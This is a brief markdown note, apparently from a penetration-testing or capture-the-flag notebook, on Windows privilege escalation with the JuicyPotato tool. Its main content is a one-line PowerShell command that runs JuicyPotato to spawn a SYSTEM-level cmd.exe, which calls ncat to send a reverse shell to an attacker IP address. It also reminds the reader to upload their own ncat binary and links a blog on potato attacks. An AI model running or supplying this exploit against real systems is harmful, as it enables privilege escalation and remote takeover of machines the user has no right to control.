![img](https://github.com/akshadjoshi/JARVIS/blob/main/windows/images/Pasted%20image%2020231129235234.png)


**on the box**
```powershell
.\JuicyPotato.exe -l 443 -p c:\windows\system32\cmd.exe -a "/c C:\Users\Public\Downloads\ncat.exe -e cmd.exe 10.10.14.7 445" -t *
```

**note**: `transfer your own ncat.exe`

**good blog on potato attacks** - https://hideandsec.sh/books/windows-sNL/page/in-the-potato-family-i-want-them-all
